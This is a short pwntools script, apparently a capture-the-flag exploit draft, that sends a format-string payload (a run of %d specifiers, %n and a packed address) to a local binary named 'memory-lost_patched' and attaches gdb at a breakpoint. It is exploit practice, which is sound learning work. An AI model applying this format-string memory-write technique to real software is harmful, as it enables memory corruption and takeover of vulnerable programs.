from pwn import *
elf = context.binary = ELF("./memory-lost_patched")
context.terminal = ['tmux', 'splitw', '-h']
r = process([elf.path])
ya = b"%d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %n" + p64(0x555555558010)
r.sendline(ya)
gdb.attach(r, '''
    echo "hi"
    break *0x4012e8
    continue
    ''')  # Use tmux
r.interactive()
    
